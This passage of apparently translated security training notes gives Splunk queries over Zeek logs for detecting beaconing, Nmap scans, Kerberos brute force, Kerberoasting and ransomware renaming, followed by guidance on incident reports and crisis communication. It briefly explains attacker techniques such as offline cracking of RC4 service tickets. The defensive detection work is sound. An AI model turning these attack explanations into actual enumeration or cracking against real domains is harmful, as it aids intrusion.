| eval prcnt = (count/total)100
| where prcnt > 90 AND total > 10
Description of fields
index="cobaltstrikebeacon": Filters events coming from the correct index.
sourcetype="bro:http:json": Specifies Zeek HTTP logs in JSON format.
sort 0 time: Sorts events in chronological order.
streamstats last(time): Calculates the time between each event for the same stream (same src/dest/port).
eventstats avg(timedelta): Calculates the average interval and total number of events for each connection.
eval upper / lower: Determines a margin around the average interval.
where timedelta > lower AND timedelta < upper: Only keeps regular intervals.
stats: Aggregates the results and calculates the regularity percentage.
where prcnt > 90 AND total > 10: Shows only connections exhibiting typical beaconing behavior.

Interpretation of results
Regular interval: If more than 90% of communications on a connection occur at constant intervals, this possibly indicates beaconing* type behavior.
Event threshold: A minimum of 10 events is required to avoid false alerts due to low data volume.
Detecting Nmap Port Scanning 
H. Detecting Nmap port scans via Splunk

Port scanning is a classic reconnaissance technique used by attackers to identify services open on a target. One of the most commonly used tools for this is Nmap.

This type of behavior manifests itself by attempts to connect to multiple ports, often without sending data (payload), in a very short period of time. Thanks to Zeek (formerly Bro) logs, we can detect these suspicious attempts by observing connections with origbytes=0 (no data transmitted) and counting the number of different ports affected.

Splunk query – Port scan detected

index="cobaltstrikebeacon" sourcetype="bro:conn:json" origbytes=0 destip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8) 
| bin span=5m time 
| stats dc(destport) as numdestport by time, srcip, destip 
| where numdestport >= 3
Explanation of the query
Data source
index="cobaltstrikebeacon": Index containing network logs captured by Zeek.
sourcetype="bro:conn:json": JSON logs relating to network connections.
Connection filtering without payload
origbytes=0: Only keeps connections where no bytes were transmitted by the sender. This often indicates an attempt at passive scanning or reconnaissance, typical of tools like Nmap.
Restriction to internal IP ranges
destip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8): We only monitor connections targeting private IP addresses, in order to detect suspicious behavior within the internal network.
Temporal aggregation
| bin span=5m time: Groups events in 5-minute increments, which allows you to identify activities grouped over time — typical behavior of a scan.
Counting targeted ports
| stats dc(destport) as numdestport by time, srcip, destip:
Counts the number of distinct ports touched (dc(destport)) by a source IP (srcip) on a destination IP (destip) during a 5 minute period.
Alert threshold
| where numdestport >= 3: Only keeps cases where at least three different ports were targeted in 5 minutes. This corresponds to suspicious behavior, which may indicate a scan in the recognition phase.

Interpretation of results
Suspicious Source IP (srcip): The address identified as having attempted to scan multiple ports without transmitting data.
Reconnaissance scanning: Low noise scans (e.g. 3 ports only) are often used to avoid detection. A higher threshold (5 or 10 ports) can be used to detect more aggressive scans.
Internal Context: An internal port scan may indicate that a compromised workstation is attempting to map the network.

Recommendations
Increase the threshold if too many false positives
  A numdest_port > 3 may be too low depending on the environment; increase to 5 or 10 depending on the network context.
Correlation with other events
  Associate this detection with exploitation attempts, SSH connection, or IDS/IPS alerts to enrich the analysis.
Detecting Kerberos Brute Force Attacks. 
G. Brute Force Kerberos attack detection via Splunk

A Kerberos brute force attack consists of sending mass AS-REQ authentication requests to the KDC (Key Distribution Center), in order to identify valid usernames. Even if authentication fails, the error messages returned allow an attacker to guess which accounts actually exist.

These attempts are usually marked by many authentication failures, and there are specific errors that distinguish valid usernames from invalid ones.

Splunk query – Kerberos brute force detection

index="kerberosbruteforce" sourcetype="bro:kerberos:json"
errormsg!=KDCERRPREAUTHREQUIRED
success="false" requesttype=AS
| bin time span=5m
| stats count dc(client) as "Unique Users" values(errormsg) as "Error Messages" by time, id.origh, id.resph
| where count>30
Explanation of the query
Data source
index="kerberosbruteforce": Index containing Kerberos logs captured by Zeek.
sourcetype="bro:kerberos:json": Source in JSON format specific to Kerberos events.
Filtering relevant errors
errormsg!=KDCERRPREAUTHREQUIRED: Excludes classic pre-authentication errors (this type of error often indicates that the user exists, which is precisely what attackers are looking for).
This allows you to focus on attempts that fail without reaching the pre-authentication stage, typical when testing on non-existent accounts.
Selecting AS-REQ authentication failures
success="false": Only keeps failed authentication attempts.
requesttype=AS: Focuses on AS-REQ type requests, sent to obtain a TGT.
Temporal grouping of events
| bin time span=5m: Groups events in 5-minute increments, which makes it possible to detect bursts of requests typical of brute force attacks.
Statistics by client and server
| stats count dc(client) as "Unique Users" values(errormsg) as "Error Messages" by time, id.origh, id.resph:
count: Total number of failed attempts per time slot and per IP address.
dc(client): Number of distinct usernames targeted.
values(errormsg): List of error messages returned, useful for identifying a phase of recognition or testing of the existence of accounts.
Alert threshold for detection
| where count>30: Only keeps cases where more than 30 failed attempts are observed in 5 minutes, which is considered suspicious.

Interpretation of results
High volume of failed attempts: A single origin (same IP) with more than 30 failed attempts in a short interval strongly indicates a brute force attack.
Diversity of targeted accounts: A large number of different users suggests an attempt to discover valid accounts.
Error Message Analysis: Some error codes may confirm that users exist, meaning the attacker is attempting to enumerate accounts before launching the attack.

To investigate
Source IP address (id.origh): Is this an internal machine? Is it supposed to generate Kerberos requests?
Target (id.resp_h): Typically a KDC, but can vary. Is this consistent with usual traffic?
Reaction in the event of an alert: Monitor the station, temporarily block the IP, strengthen logging and activate protections such as limiting attempts.
Detecting Kerberoasting 
F. Kerberoasting detection via Splunk

Kerberoasting is an attack technique where an attacker with valid credentials in the domain requests TGS (Ticket Granting Service) tickets for service accounts (SPN). These tickets, often encrypted with the RC4 algorithm, can then be cracked offline to extract the clear passwords of the targeted accounts.

The main indicator is the abnormal demand for TGS tickets using RC4, as this encryption method is favored for cracking.

Splunk Query – Kerberoasting Detection

index="sharphound" sourcetype="bro:kerberos:json"
requesttype=TGS cipher="rc4-hmac" 
forwardable="true" renewable="true"
| table time, id.origh, id.resph, requesttype, cipher, forwardable, renewable, client, service
Explanation of the query
Data source
index="sharphound": Index containing Kerberos events, collected by a tool like SharpHound or a network monitoring system.
sourcetype="bro:kerberos:json": Uses Zeek (formerly Bro) logs for Kerberos events in JSON format.
Filtering TGS requests encrypted in RC4
requesttype=TGS: Only accepts service ticket requests.
cipher="rc4-hmac": Selects tickets using RC4 encryption, which is more vulnerable and therefore favored by attackers.
Suspicious behavioral criteria
forwardable="true": The ticket can be reused on other services.
renewable="true": The ticket can be extended, which is useful for an attacker looking for persistence.
Clear display of results
table time, id.origh, id.resph, requesttype, cipher, forwardable, renewable, client, service: Displays essential information for analysis:
Date and time of the event.
Source IP (client) and destination IP (often a domain controller).
Type of query, encryption used.
Customer account and target service.

Interpretation
Multiple TGS requests in RC4: A high frequency of TGS requests with RC4 by the same user or host is highly suspicious.
Privileged accounts or sensitive services: If the service field targets a critical account (SQL, Exchange, etc.), this may indicate an attempt at Kerberoasting.
Centralized activity on a user station: Massive TGS requests from a user station (rather than a service or server) are abnormal.

To investigate
Customer (id.orig_h): Is this a legitimate machine?
Account (customer): Is this a normal user account or a hijacked service account?

Detecting Ransomware 
Ransomware detection with Splunk
1. Detection of excessive file opening and renaming operations

This type of behavior is often seen in ransomware attacks, where many files are opened and renamed in short periods of time.
Splunk query

index="ransomwareopenrenamesodinokibi" sourcetype="bro:smbfiles:json" 
| where action IN ("SMB::FILEOPEN", "SMB::FILERENAME")
| bin time span=5m
| stats count by time, source, action
| where count>30 
| stats sum(count) as count values(action) dc(action) as uniqactions by time, source
| where uniqactions==2 AND count>100
Explanation of the query
Event filtering: The search is limited to FILEOPEN and FILERENAME actions in the specified index.
Grouping by 5-minute intervals: Events are grouped into 5-minute periods to detect peaks in activity.
Event counting: Actions are counted by source in each 5-minute period, with a threshold of 30 actions.
Aggregation of results: Checks if the FILEOPEN and FILERENAME actions are present in the first 100 occurrences, which may indicate ransomware behavior.

2. Detection of excessive file renaming with new extensions

Ransomware often renames files with unique extensions to indicate that they have been encrypted.
Splunk query

index="ransomwarenewfileextensionctblocker" sourcetype="bro:smbfiles:json" action="SMB::FILERENAME" 
| bin time span=5m
| rex field="name" "\.(?<newfilenameextension>[^\.]$)"
| rex field="prevname" "\.(?<oldfilenameextension>[^\.]$)"
| stats count by time, id.origh, id.respp, name, source, oldfilenameextension, newfilenameextension
| where newfilenameextension!=oldfilenameextension
| stats count by time, id.origh, id.respp, source, newfilenameextension
| where count>20
| sort -count
Explanation of the query
Filtering by action and time: Limits results to file renaming events in 5 minute windows.
Extracting Extensions: Uses regular expressions to extract extensions from files before and after renaming.
Filtering extension changes: Only keeps events where the file extension has changed.
Aggregation of results: Counts occurrences of new filenames by source and newfilenameextension.
Ransomware detection: Identifies cases where more than 20 files have been renamed to the same new extension within a 5-minute interval.

Security Incident Reporting
Incident Reporting Process 
Overview

Security incident reporting is essential in today's technology landscape to protect organizational assets and respond effectively to threats. This process helps document incidents, learn from past events, and improve future response capabilities.
Significance

The incident report:
Links detection to mitigation.
Creates a repository of lessons learned.
Informs risk assessment, compliance and stakeholder awareness.
Identification and Categorization of Incidents
Main sources:
Security tools: IDS, IPS, EDR, XDR, SIEM, antivirus, NetFlow data.
Human Observation: Employee reports of unusual activities.
Third-party notifications: Alerts from partners, suppliers or customers.
Types of incidents:
Malware: Viruses, ransomware.
Phishing: Attempts to steal sensitive data.
DDoS: Saturation attacks to disrupt services.
Unauthorized Access: Unauthorized entry into systems or data.
Data leak: Accidental exposure of data.
Physical Breach: Unauthorized physical access.
Severity levels:
Critical (P1): Immediate risk to main functions, requires urgent action.
High (P2): Significant risk, requires rapid attention.
Medium (P3): Moderate risk, a timely response is recommended.
Low (P4): Minor issues, can be managed in daily operations.
Incident Report Process
Detection and recognition: Initial identification, often through automated alerts or human observations.
Preliminary analysis: Assess the scope and potential impact; categorize the incident.
Incident Recording: Document all details. Use tools like JIRA, TheHive or simpler alternatives.
Notification:
Internal: Inform IT, legal, PR and executive teams.
External: If necessary, notify customers, partners, regulatory authorities or the public.
Investigation and detailed report: Carry out an in-depth analysis of the incident.
Creation of the final report: Provide a comprehensive report to stakeholders, detailing the incident, its causes and corrective actions.
Feedback loop: Post-incident analysis to improve response preparedness.
Elements of a Proper Incident Report 
Executive Summary

The executive summary serves as an entry point accessible to a broad audience, including non-technical stakeholders. This section provides a concise overview, key findings, immediate actions taken and impact on stakeholders. Many stakeholders will only read this section, so ensuring clarity is essential.
Section |  Description
Incident ID: Unique identifier of the incident.
Incident Overview: Summary of incident events (including initial detection) and attack type (e.g. ransomware, data breach). Include estimated time, duration, affected systems/data, and status (in progress, resolved, or escalated).
Key Findings: Summary of root cause and specific vulnerabilities exploited. Mention compromised or exfiltrated data.
Immediate Actions Taken: Details of actions taken, such as isolating systems, identifying the root cause, and engaging third-party services.
Impact on stakeholders: Assess the impact on customers, employees, proprietary information and potential financial consequences.
Technical Analysis

In-depth analysis of technical events during the incident. This section should cover:
Affected Systems and Data
List all compromised or potentially accessible systems. If data was exfiltrated, specify the quantity.
Sources of Evidence and Analysis
Include all analyzed evidence and methodology (e.g. web access logs). Emphasize proof integrity with hashes where necessary.
Indicators of Compromise (IoC)
Provide IoC (e.g. unusual processes, outbound traffic) for threat hunting or attribution to specific threat actors.
Root Cause Analysis
Detailed explanation of exploited vulnerabilities, root causes and failure points.
Technical Timeline

Document key events, including:
Recognition
Initial compromise
C2 communications
Enumeration, lateral movement
Data access and exfiltration
Malware deployment (Process injection, persistence)
Containment, eradication and recovery times
Nature of the attack
Explanation of the type of attack, TTPs (tactics, techniques and procedures) used by the attacker.
Impact Analysis

Assess negative effects on data, operations and reputation. This includes quantification and qualification of damages, business implications (e.g. financial losses), regulatory penalties and reputational impacts.
Response and Recovery Analysis
Immediate Response Actions

Revocation of access
Compromised accounts/systems identified: Details of tools and methods used to identify compromised entities.
Time frame: Accurate timestamp of detection and revocation.
Revocation Method: Explanation of revocation methods (e.g., disabling accounts, changing firewall rules).
Impact: Prevention of any further compromise or exfiltration.

Containment Strategy
Short-term containment: Isolation of affected systems from the network.
Long-term containment: Strategic measures such as segmentation or the implementation of zero-trust security.
Effectiveness: Evaluation of containment measures.
Eradication Measures

Malware Removal
Identification: Procedures used to detect malware, including EDR tools or forensic analysis.
Removal Techniques: Specific tools or manual methods used.
Verification: Steps to ensure complete deletion, such as verifying checksums.

System Patching
Vulnerability Identification: Methods for discovering vulnerabilities (e.g. CVEs).
Patch Management: Steps for testing, deploying, and verifying patches.
Rollback Procedures: Procedures in the event of instability after deployment.
Recovery Stages

Data restoration
Backup Validation: Procedures to confirm the integrity of backups.
Restoration Process: Detailed steps for data recovery.
Data Integrity Checks: Verifying the accuracy of restored data.

System Validation
Security measures: Ensure system security by reconfiguring or updating IDS.
Operational controls: Verifying that systems are operating as intended.
Post-Incident Actions
Monitoring
Enhanced Monitoring Plans: Detailed plans for future monitoring to detect similar vulnerabilities.
Tools and technologies: Specific tools integrated into the surveillance strategy.
Lessons Learned
Gap Analysis: Assessment of failed security measures.
Recommendations for improvement: Concrete steps to strengthen defenses.
Future Strategy: Long-term changes in policy, architecture or training.
Diagrams

Use visuals to simplify the complexities of the incident:
Incident flow diagram: Attack progression from entry point to network propagation.
Map of affected systems: Network topology highlighting compromised nodes.
Attack Vector Diagram: Diagram of the attacker's movement and exploitation path.
Appendices

Provides additional context, evidence, or technical details. This section serves as the basis for verification and adds depth to the main narrative of the report.

Content may include:
Log files
Network diagrams (before and after the incident)
Forensic evidence (disk images, memory dumps)
Code Snippets
Incident Response Checklist
Communication archives
Compliance documents (NDA, regulatory forms)
Glossary and acronyms
Best Practices
Root cause analysis: Identify the root cause to avoid a repeat.
Community Sharing: Share non-sensitive information with the security community.
Regular updates: Keep stakeholders informed throughout the incident response.
External review: Use third-party experts to validate findings.
Conclusion

An incident report is essential after a security event, providing in-depth analysis of what went wrong, effective responses, and strategies to prevent similar events in the future.
Communications 
Effective Communication in the Event of a Security Crisis

Effective communication is essential during a crisis, especially during a security incident. Transparent, coordinated, and well-structured communication supports building trust, regulatory compliance, and effective response efforts.
The Importance of Effective Communication

The value of clear communication during an incident can be categorized into several key areas:
Stakeholder Trust

Transparent communication promotes stakeholder trust. By communicating quickly and clearly, an organization demonstrates accountability, transparency and control over the incident.
Coordination and Efficiency

A cybersecurity incident affects more than just the technical team; it has broader implications within the organization. Coordinated communication ensures alignment among all stakeholders, improving the speed and effectiveness of response.
Regulatory Compliance

Check your organization's specific compliance requirements, which should be documented in the Incident Response Plan (IRP). Regulatory guidelines often dictate how, when and what must be communicated to meet legal requirements.
Internal Communication

Internal communications are crucial to maintaining a consistent and consistent message within the organization. This is particularly important to avoid leaks and misinformation. Key elements of internal communications include:
Immediate Notification: Quickly inform all relevant stakeholders upon identification of the incident.
Regular Updates: Share regular updates with relevant teams, covering incident status, potential impacts and ongoing actions.
Feedback Loop: Establish a feedback channel for teams to share their comments, concerns and suggestions.
External Communication

External communications must be carefully planned, as they often involve various third parties, from customers to regulators. Important considerations include:
Affected Parties: Communicate directly with affected individuals or entities, such as customers, partners or suppliers.
Public Statement: In the event of large-scale incidents, consider issuing a clear, jargon-free public statement to ensure accessibility.
Regulatory Bodies: Notify regulatory entities, such as the CNIL (Commission Nationale de l’Informatique et des Libertés), if required by jurisdiction or law, within the specified deadlines.
Navigating Communication Channels During Cybersecurity Incidents

Effective communication during a cybersecurity incident requires secure and compliant channels. Here is an overview of the technical and regulatory considerations for these channels.
Security Dimensions of Communication Channels
Encryption: Ensure all communications are secure with end-to-end encryption, especially when discussing sensitive details.
Authentication and Authorization: Protect access to communication channels with strict multi-factor authentication (MFA) to verify identities.
Data Integrity: Use cryptographic hashes to ensure that messages remain unchanged during transmission.
Ephemeral Communications: For highly confidential discussions, consider using platforms that delete messages after they are read to reduce the risk of future leaks.
Air-Gapped Communications: If primary communications systems are compromised, use isolated systems that are separated from other networks to maintain security.
Regulatory Dimensions of Communication Channels
Data Privacy Laws: Adhere to data privacy regulations, such as GDPR (General Data Protection Regulation), especially when it comes to personal data, to ensure compliance.
Breach Notification Mandates: Follow jurisdiction-specific deadlines and guidelines for notifying stakeholders in the event of a data breach.
Document Retention: Balance ephemeral messaging with document retention requirements, as some regulations require retention of incident-related communications.
Cross-Border Communications: Be aware of data sovereignty laws that may affect communications protocols and data storage if the incident involves multiple jurisdictions.
Chain of Custody: Maintain an unbroken chain of custody for all communications if legal proceedings are anticipated, to ensure that evidence remains admissible in court.
Conclusion

Effective communication is a critical component of incident response, linking internal coordination and regulatory requirements. By implementing secure, well-planned and compliant communications strategies, organizations can build resilience and respond more effectively to security incidents.
